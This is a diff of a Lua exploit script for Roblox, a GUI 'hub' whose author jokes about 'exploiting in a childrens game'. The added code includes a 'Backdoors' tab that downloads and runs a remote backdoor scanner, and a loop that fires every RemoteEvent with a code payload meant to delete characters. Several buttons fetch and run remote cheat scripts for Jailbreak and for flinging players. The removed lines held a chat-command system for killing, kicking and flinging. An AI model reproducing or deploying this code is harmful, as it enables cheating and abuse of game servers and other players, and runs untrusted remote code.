@@ -1,26 +1,20 @@
+-- this hub sucks, its mostly just if and for statements 💀, one of the only functioning stuff i made here was like uhhhhhhh idk FE admin if you can call it that?
 local player = game.Players.LocalPlayer
-local whitelist = {[4725091979] = true, 
-                [572150194] = true, 
-                [2708473715] = true
-}
+local theme = "BloodTheme"
 
--- this hub sucks, its mostly just if statements
-
-local theme = "Midnight"
-
-if (whitelist[player.UserId]) then
-    warn("Hi " .. player.Name .. ", You are using Wails hub")
+if game then
+    warn("Hi " .. player.Name .. ", You are using Wails hub!")
     local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 
     local Window = Library.CreateLib("Wails Hub", theme)
 
     -- Welcome tab
     local welcomeTab = Window:NewTab("Welcome!")
-    local welcomesection1 = welcomeTab:NewSection("Hi, this is my script")
-    local welcomesection2 = welcomeTab:NewSection("I made this for me and you hamza")
-    local welcomesection3 = welcomeTab:NewSection("Good luck exploiting in a childrens game!")
+    local welcomesection = welcomeTab:NewSection("Hi, this is my script")
+    welcomesection:NewLabel("I made this for me and you hamza")
+    welcomesection:NewLabel("Good luck exploiting in a childrens game!")
 
-    welcomesection3:NewKeybind("Toggle UI On and Off", "Can be changed", Enum.KeyCode.RightControl, function()
+    welcomesection:NewKeybind("Toggle UI On and Off", "Can be changed", Enum.KeyCode.F1, function()
         Library:ToggleUI()
     end)
 
@@ -94,6 +88,15 @@ if (whitelist[player.UserId]) then
         print("reset gravity succesfully")
         game.Workspace.Gravity = 196.2
     end) 
+
+    localSection1:NewSlider("Lightning", "THE LIGHT, MY EYES", 100, -100, function(s)
+        game:GetService("Lighting"). Brightness = s
+        print("Changed lighting to " .. s)
+    end)
+
+    localSection1:NewButton("Reset Lightning", "Normal is 2", function(s)
+        game:GetService("Lighting"). Brightness = 2
+    end)
 
     localSection2:NewTextBox("Teleport", "Teleport to a player", function(txt)
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[txt].Character.HumanoidRootPart.CFrame
@@ -173,7 +176,7 @@ if (whitelist[player.UserId]) then
             "You are fabulous!",
             "You are a human.",
             "I wish you a happy day today!",
-            "You look an angel!"
+            "You look like an angel!"
         }
         
         print("Starting")
@@ -208,16 +211,33 @@ if (whitelist[player.UserId]) then
         print("Done")
     end)
 
+    --Backdoor
+    local backdoorTab = Window:NewTab("Backdoors")
+    local backdoorSection = backdoorTab:NewSection("Backrooms refrnece???")
+
+    backdoorSection:NewLabel("Basically exploitable RemoteEvents")
+
+    backdoorSection:NewButton("Backdoor.exe", "Good i think idk", function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+    end)
+
+    backdoorSection:NewButton("Simple Backdoor Checker", "if character deletes then backdoor", function()
+        for i, v in next, game:GetDescendants() do
+        if v:IsA('RemoteEvent') then v:FireServer([[game.Players.LocalPlayer.Character:Destroy()]])
+        end
+        end
+    end)
+
     -- Jailbreak
     local jailbreakTab = Window:NewTab("Jailbreak")
     local jailbreakSection = jailbreakTab:NewSection("Jailbreak for the gigachad Hamza!!!")
 
-    jailbreakSection:NewButton("EVO V4", "Cool", function()
+    jailbreakSection:NewButton("EVO V4", "sounds like Evon, but instead its cool.", function()
         print("executed evo v4 script succesfully")
         loadstring(game:HttpGet("https://projectevo.xyz/v4/script.lua", true))(); 
     end)
 
-    jailbreakSection:NewButton("Sensation", "It doesnt work, i think", function()
+    jailbreakSection:NewButton("Sensation", "try it. idk maybe works maybe not", function()
         print("executed sensation script succesfully")
         loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/99606f43e2dac85f6afc1d93d0a02d2d.lua"))()
     end)
@@ -236,118 +256,14 @@ if (whitelist[player.UserId]) then
         print("executed :flushed:")
     end)
 
-    -- Admin
-    local adminTab = Window:NewTab("Admin")
-    local adminSection = adminTab:NewSection("Admin (i made this myself :D)")
-
-    adminSection:NewTextBox("Whitelist a player", "Whitlists somebody", function(txt)
-        local player = game.Players.LocalPlayer
-        local controller = txt
-        local cPlayer = game.Players[controller]
-
-        warn("Started")
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(game.Players[controller].DisplayName .. " Has been whitelisted to use commands on me! -Made by ADADZASXDC (Natsu)","all")
-        wait(1)
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Commands are: /kill /poison /bring /permdeath /walk /kick /rejoin /sit /fling /freeze /unfreeze /dance /stand /unstand /zerogravity /normalgravity","all")
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/stronggravity /cmds","all")
-        game.Players[controller].Chatted:Connect(function(Message)
-            if Message == "/kill" then
-                player.Character.Humanoid.Health = 0 
-            end
-            if Message == "/bring" then
-                player.Character.HumanoidRootPart.CFrame = cPlayer.Character.HumanoidRootPart.CFrame
-            end
-            if Message == "/poison" then
-                for i = 100, 0, -1 do
-                player.Character.Humanoid.Health = player.Character.Humanoid.Health - 1
-                wait(1)
-                end
-            end
-            if Message == "/permdeath" then 
-                player.Character.Parent = nil
-                wait(1)
-                player.Character.Humanoid.Health = 0
-            end
-            if Message == "/walk" then
-                player.Character.Humanoid:MoveTo(cPlayer.Character.HumanoidRootPart.Position)
-            end
-            if Message == "/rejoin" then
-                game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
-            end
-            if Message == "/kick" then
-                player:Kick("You have been kicked by " .. game.Players[controller].DisplayName)
-            end
-            if Message == "/dance" then
-                game:GetService("Players"):Chat("/e dance")
-            end
-            if Message == "/sit" then
-                player.Character.Humanoid.Sit = true
-            end
-            if Message == "/fling" then
-                player.Character.HumanoidRootPart.Velocity = Vector3.new(1000, 1000, 1000)
-            end
-            if Message == "/freeze" then
-                for i, v in pairs(player.Character:GetChildren()) do
-                    if v:IsA("BasePart") then
-                        v.Anchored = true
-                    end
-                end
-            end
-            if Message == "/unfreeze" then
-                for i, v in pairs(player.Character:GetChildren()) do
-                    if v:IsA("BasePart") then
-                        v.Anchored = false
-                    end
-                end
-            end
-            if Message == "/stand" then
-                local runservice = game:GetService("RunService")
-                _G.on = true
-                local target = cPlayer
-                runservice.Heartbeat:Connect(function()
-                    if _G.on then
-                        game.Workspace.Gravity = 0
-                        local offset = CFrame.new(1.1,1,1.1)
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cPlayer.Character.HumanoidRootPart.CFrame * offset
-                    end
-                end)
-            end
-            if Message == "/unstand" then
-                _G.on = false
-                game.Workspace.Gravity = 196.2
-            end
-            if Message == "/zerogravity" then
-                game.Workspace.Gravity = 0
-                wait(0.5)
-                game.Players.LocalPlayer.Character.Humanoid.Jump = true
-            end
-            if Message == "/normalgravity" then
-                game.Workspace.Gravity = 196.2
-            end
-            if Message == "/stronggravity" then
-                game.Workspace.Gravity = 981
-            end
-            if Message == "/cmds" then
-                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Commands are: /kill /poison /bring /permdeath /walk /kick /rejoin /sit /fling /freeze /unfreeze /dance /stand /unstand /zerogravity /normalgravity","all")
-                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/stronggravity /cmds","all")
-            end
-            if Message == "/spin" then --skidded from infinite yield lol
-                local Spin = Instance.new("BodyAngularVelocity")
-                Spin.Name = "Spinning"
-                Spin.Parent = player.Character.HumanoidRootPart
-                Spin.MaxTorque = Vector3.new(0, math.huge, 0)
-                Spin.AngularVelocity = Vector3.new(0, 100,0)
-            end
-            if Message == "/unspin" then
-                local Spin = player.Character.HumanoidRootPart:WaitForChild("Spinning")
-                Spin:Destroy()
-            end
-        end)
+    -- FPATS
+    local mowTab = Window:NewTab("FPAT")
+    local mowSection = mowTab:NewSection("Fling people and things, made for mow :D")
+    mowSection:NewButton("Script 1", "idk", function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/spacexrandom/Lua/main/FlingThingsAndPeople"))()
     end)
+    mowSection:NewLabel("I could only find 1 :(")
 
-    adminSection:NewButton("Admin all", "To be added soon", function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Wailx250/WailsHub/main/admin-all.lua",true))()
-    end)
 else
     player:Kick("Not whitelisted.")
 end
